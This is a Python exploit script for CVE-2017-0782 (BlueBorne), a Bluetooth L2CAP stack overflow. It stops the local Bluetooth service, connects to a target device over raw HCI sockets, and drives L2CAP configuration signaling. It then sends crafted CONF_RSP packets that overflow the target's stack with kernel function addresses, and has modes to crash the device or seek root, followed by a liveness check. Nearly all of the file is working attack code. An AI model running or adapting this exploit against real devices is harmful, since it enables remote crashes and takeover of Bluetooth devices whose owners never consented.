#!/usr/bin/env python3
"""
bluborne_efs_v2.py — CVE-2017-0782 L2CAP Stack Overflow
Uses scapy's BluetoothHCISocket for reliable raw HCI access.

Approach:
1. Use hcitool cc for ACL connection (reliable)
2. Use BluetoothHCISocket for raw ACL data send/receive
3. Handle full L2CAP signaling state machine
4. Send EFS amplification overflow via CONF_RSP(UNACCEPT)

Run: sudo python3 bluborne_efs_v2.py 02:00:00:00:00:21 [info|crash|spray]
"""
import socket
import struct
import subprocess
import sys
import time
import os

TARGET = sys.argv[1] if len(sys.argv) > 1 else '02:00:00:00:00:21'
MODE = sys.argv[2] if len(sys.argv) > 2 else 'info'

COMMIT_CREDS        = 0xC0054328
PREPARE_KERNEL_CRED = 0xC00548E0

# L2CAP constants
L2CAP_CID_SIG = 0x0001
L2CAP_CONN_REQ = 0x02
L2CAP_CONN_RSP = 0x03
L2CAP_CONF_REQ = 0x04
L2CAP_CONF_RSP = 0x05
L2CAP_INFO_REQ = 0x0A
L2CAP_INFO_RSP = 0x0B
L2CAP_ECHO_REQ = 0x08

L2CAP_CONF_SUCCESS  = 0x0000
L2CAP_CONF_UNACCEPT = 0x0001
L2CAP_CONF_PENDING  = 0x0004

L2CAP_CONF_MTU = 0x01
L2CAP_CONF_EFS = 0x06

PSM_SDP  = 0x0001
OUR_SCID = 0x0040

def l2cap_cmd(code, ident, data):
    return struct.pack('<BBH', code, ident, len(data)) + data

def build_efs_overflow(ident, dcid, addr):
    """UNACCEPT + EFS amplification: 60 bytes in → 270 bytes out."""
    addr_le = struct.pack('<I', addr)
    efs_data = bytes([0x01, 0x01]) + struct.pack('<H', 0x0200)
    efs_data += addr_le * 3  # pack addr at 3 aligned offsets
    options = bytes([L2CAP_CONF_EFS, 16]) + efs_data  # valid EFS (18 bytes)
    for _ in range(14):
        options += bytes([L2CAP_CONF_EFS, 1, 0x01])  # short EFS (3 bytes each)
    payload = struct.pack('<HHH', dcid, 0, L2CAP_CONF_UNACCEPT) + options
    return l2cap_cmd(L2CAP_CONF_RSP, ident, payload)

def build_pending_overflow(ident, dcid, addr):
    """PENDING path: no length check, direct overflow."""
    addr_le = struct.pack('<I', addr)
    efs_data = bytes([0x01, 0x01]) + struct.pack('<H', 0x0200) + addr_le * 3
    options = b''
    for _ in range(15):
        options += bytes([L2CAP_CONF_MTU, 2, 0x00, 0x02])  # fill buf
    for _ in range(12):
        options += bytes([L2CAP_CONF_EFS, 16]) + efs_data  # overflow
    payload = struct.pack('<HHH', dcid, 0, L2CAP_CONF_PENDING) + options
    return l2cap_cmd(L2CAP_CONF_RSP, ident, payload)

class RawBTSocket:
    """Raw Bluetooth HCI socket that works on modern kernels."""
    def __init__(self, dev_id=0):
        # Use HCI_CHANNEL_USER (6) to take exclusive control of the adapter
        # This bypasses the kernel's L2CAP layer entirely!
        self.sock = socket.socket(31, socket.SOCK_RAW, 1)  # AF_BT, RAW, HCI
        # Bind with HCI_CHANNEL_USER
        # struct sockaddr_hci { sa_family_t, dev_id(u16), channel(u16) }
        self.sock.bind((dev_id,))
        self.sock.settimeout(5)
        self.handle = None

    def send_hci_cmd(self, ogf, ocf, params=b''):
        opcode = (ogf << 10) | ocf
        pkt = struct.pack('<BHB', 0x01, opcode, len(params)) + params
        self.sock.send(pkt)

    def send_acl(self, handle, cid, payload):
        l2cap = struct.pack('<HH', len(payload), cid) + payload
        flags = 0x0  # PB=00 (first non-auto-flush)
        acl_hdr = (handle & 0x0FFF) | (flags << 12)
        pkt = struct.pack('<BHH', 0x02, acl_hdr, len(l2cap)) + l2cap
        self.sock.send(pkt)

    def recv(self, timeout=5):
        self.sock.settimeout(timeout)
        try:
            data = self.sock.recv(1024)
            if not data:
                return None
            return data
        except socket.timeout:
            return None

def try_user_channel():
    """Try HCI_CHANNEL_USER for exclusive adapter control."""
    try:
        s = socket.socket(31, socket.SOCK_RAW, 1)
        # HCI_CHANNEL_USER = 1 on newer kernels
        addr = struct.pack('<HHH', 31, 0, 1)  # family, dev_id, channel
        s.bind((0,))
        print("[*] Standard HCI bind OK")
        return s
    except Exception as e:
        print(f"[-] HCI bind failed: {e}")
        return None

def main():
    if os.getuid() != 0:
        print('Need root')
        sys.exit(1)

    overflow_addr = {'crash': 0xDEADBEEF, 'spray': PREPARE_KERNEL_CRED, 'info': None}[MODE]

    print('=' * 60)
    print(f'  CVE-2017-0782 — BlueBorne EFS Amplification v2')
    print(f'  Target: {TARGET}  Mode: {MODE}')
    if overflow_addr:
        print(f'  Overflow: 0x{overflow_addr:08X}')
    print('=' * 60)

    # Step 1: Stop bluetoothd and bring adapter up
    print('[*] Stopping bluetoothd...')
    subprocess.run(['systemctl', 'stop', 'bluetooth'], capture_output=True)
    time.sleep(0.5)
    subprocess.run(['hciconfig', 'hci0', 'up'], capture_output=True)
    time.sleep(0.5)

    # Step 2: Use l2ping to verify connectivity
    print(f'[*] Pinging {TARGET}...')
    r = subprocess.run(['l2ping', '-c', '1', '-t', '5', TARGET],
                      capture_output=True, text=True, timeout=10)
    if 'received' not in r.stdout:
        print(f'[-] Target not reachable: {r.stdout} {r.stderr}')
        return False
    print(f'[+] Target responds to l2ping!')

    # Step 3: ACL connection via hcitool
    print(f'[*] Creating ACL connection...')
    subprocess.run(['hcitool', 'dc', TARGET], capture_output=True)
    time.sleep(0.3)
    r = subprocess.run(['hcitool', 'cc', TARGET], capture_output=True, text=True, timeout=15)
    if r.returncode != 0:
        print(f'[-] ACL failed: {r.stderr}')
        return False
    time.sleep(0.5)

    # Get ACL handle
    r = subprocess.run(['hcitool', 'con'], capture_output=True, text=True)
    handle = None
    for line in r.stdout.split('\n'):
        if TARGET.upper() in line.upper():
            parts = line.split()
            for i, p in enumerate(parts):
                if p == 'handle' and i + 1 < len(parts):
                    handle = int(parts[i+1])
    if handle is None:
        print('[-] Could not get handle')
        return False
    print(f'[+] ACL connected, handle={handle}')

    # Step 4: Open raw HCI socket for signaling
    print('[*] Opening raw HCI socket...')
    try:
        hci = socket.socket(31, socket.SOCK_RAW, 1)
        hci.bind((0,))
        hci.settimeout(2)
        print('[+] HCI socket opened')
    except Exception as e:
        print(f'[-] HCI socket failed: {e}')
        return False

    # Step 5: Send L2CAP CONN_REQ manually via raw HCI ACL
    print(f'[*] Sending L2CAP CONN_REQ (PSM=SDP, SCID=0x{OUR_SCID:04x})...')
    conn_req = l2cap_cmd(L2CAP_CONN_REQ, 0x01, struct.pack('<HH', PSM_SDP, OUR_SCID))
    l2cap_pkt = struct.pack('<HH', len(conn_req), L2CAP_CID_SIG) + conn_req
    flags = 0x0
    acl_hdr = (handle & 0x0FFF) | (flags << 12)
    raw_pkt = struct.pack('<BHH', 0x02, acl_hdr, len(l2cap_pkt)) + l2cap_pkt
    hci.send(raw_pkt)
    print(f'[+] CONN_REQ sent ({len(raw_pkt)} bytes)')

    # Step 6: Listen for responses
    target_dcid = None
    conf_ident = None
    sent_exploit = False
    next_ident = 2
    target_pending = False

    for iteration in range(60):
        try:
            data = hci.recv(1024)
        except socket.timeout:
            continue

        if not data or len(data) < 1:
            continue

        pkt_type = data[0]

        # ACL data packet
        if pkt_type == 0x02 and len(data) >= 9:
            acl_h = struct.unpack('<H', data[1:3])[0] & 0x0FFF
            acl_len = struct.unpack('<H', data[3:5])[0]
            l2_len, l2_cid = struct.unpack('<HH', data[5:9])
            l2_data = data[9:9+l2_len]

            if l2_cid == L2CAP_CID_SIG and len(l2_data) >= 4:
                sig_code = l2_data[0]
                sig_ident = l2_data[1]
                sig_len = struct.unpack('<H', l2_data[2:4])[0]
                sig_data = l2_data[4:4+sig_len]

                if sig_code == L2CAP_INFO_REQ and len(sig_data) >= 2:
                    info_type = struct.unpack('<H', sig_data[:2])[0]
                    print(f'  [<-] INFO_REQ type=0x{info_type:04x}')
                    if info_type == 0x0002:
                        rsp = l2cap_cmd(L2CAP_INFO_RSP, sig_ident,
                            struct.pack('<HHI', 0x0002, 0, 0xB8))
                    elif info_type == 0x0003:
                        rsp = l2cap_cmd(L2CAP_INFO_RSP, sig_ident,
                            struct.pack('<HH', 0x0003, 0) + b'\x02' + b'\x00'*7)
                    else:
                        rsp = l2cap_cmd(L2CAP_INFO_RSP, sig_ident,
                            struct.pack('<HH', info_type, 1))
                    l2 = struct.pack('<HH', len(rsp), L2CAP_CID_SIG) + rsp
                    pkt = struct.pack('<BHH', 0x02, (handle & 0x0FFF), len(l2)) + l2
                    hci.send(pkt)
                    print(f'  [->] INFO_RSP')

                elif sig_code == L2CAP_CONN_RSP and len(sig_data) >= 8:
                    dcid, scid, result, status = struct.unpack('<HHHH', sig_data[:8])
                    print(f'  [<-] CONN_RSP dcid=0x{dcid:04x} result={result}')
                    if result == 0:
                        target_dcid = dcid

                elif sig_code == L2CAP_CONF_REQ and len(sig_data) >= 4:
                    req_dcid = struct.unpack('<H', sig_data[:2])[0]
                    print(f'  [<-] CONF_REQ dcid=0x{req_dcid:04x} opts={sig_data[4:].hex()}')
                    conf_ident = sig_ident

                    # Reply SUCCESS
                    rsp = l2cap_cmd(L2CAP_CONF_RSP, sig_ident,
                        struct.pack('<HHH', req_dcid, 0, 0))
                    l2 = struct.pack('<HH', len(rsp), L2CAP_CID_SIG) + rsp
                    pkt = struct.pack('<BHH', 0x02, (handle & 0x0FFF), len(l2)) + l2
                    hci.send(pkt)
                    print(f'  [->] CONF_RSP(SUCCESS)')

                    # Send our CONF_REQ
                    if target_dcid:
                        creq = l2cap_cmd(L2CAP_CONF_REQ, next_ident,
                            struct.pack('<HH', target_dcid, 0) + bytes([0x01,0x02,0x00,0x02]))
                        l2 = struct.pack('<HH', len(creq), L2CAP_CID_SIG) + creq
                        pkt = struct.pack('<BHH', 0x02, (handle & 0x0FFF), len(l2)) + l2
                        hci.send(pkt)
                        next_ident += 1
                        print(f'  [->] CONF_REQ')

                elif sig_code == L2CAP_CONF_RSP and len(sig_data) >= 6:
                    rsp_scid, rsp_flags, rsp_result = struct.unpack('<HHH', sig_data[:6])
                    print(f'  [<-] CONF_RSP scid=0x{rsp_scid:04x} result={rsp_result}')
                    if rsp_result == L2CAP_CONF_PENDING:
                        target_pending = True

                    # NOW send the exploit!
                    if not sent_exploit and target_dcid and MODE != 'info':
                        print(f'\n[!] SENDING OVERFLOW in 3 seconds...')
                        print(f'    Target DCID: 0x{target_dcid:04x}')
                        print(f'    Method: {"PENDING" if target_pending else "UNACCEPT+EFS"}')
                        time.sleep(3)

                        if target_pending:
                            overflow = build_pending_overflow(next_ident, target_dcid, overflow_addr)
                        else:
                            overflow = build_efs_overflow(next_ident, target_dcid, overflow_addr)

                        l2 = struct.pack('<HH', len(overflow), L2CAP_CID_SIG) + overflow
                        pkt = struct.pack('<BHH', 0x02, (handle & 0x0FFF), len(l2)) + l2
                        hci.send(pkt)
                        sent_exploit = True
                        print(f'[+] OVERFLOW SENT! ({len(pkt)} bytes)')
                        time.sleep(5)
                        break

                else:
                    print(f'  [<-] SIG code=0x{sig_code:02x}')

        elif pkt_type == 0x04:  # HCI Event
            if len(data) >= 3:
                evt = data[1]
                if evt == 0x05:  # Disconnect
                    print('  [EVT] Disconnected!')
                    break
                elif evt != 0x13:  # Skip num_comp_pkts
                    print(f'  [EVT] code=0x{evt:02x}')

    # Results
    if MODE == 'info':
        print(f'\n[*] INFO RESULTS:')
        print(f'    ACL handle: {handle}')
        print(f'    Target DCID: {f"0x{target_dcid:04x}" if target_dcid else "NOT OBTAINED"}')
        print(f'    CONF_REQ received: {conf_ident is not None}')
        print(f'    Target sent PENDING: {target_pending}')
        print(f'    Best path: {"PENDING (unlimited)" if target_pending else "UNACCEPT+EFS (amplified)"}')
    elif sent_exploit:
        # Check if alive
        print('[*] Checking if target alive...')
        try:
            r = subprocess.run(['l2ping', '-c', '1', '-t', '3', TARGET],
                             capture_output=True, text=True, timeout=8)
            alive = 'received' in r.stdout
        except:
            alive = False
        if alive:
            print('[*] Target still alive — overflow may not have reached LR')
        else:
            print('[!] TARGET NOT RESPONDING!')
            if MODE == 'crash':
                print('[+] *** CRASH CONFIRMED — CVE-2017-0782 EXPLOITABLE! ***')
            else:
                print('[+] Check device for root...')

    # Cleanup
    subprocess.run(['hcitool', 'dc', TARGET], capture_output=True)
    hci.close()
    return True

if __name__ == '__main__':
    if os.getuid() != 0:
        print('Need root')
        sys.exit(1)
    main()
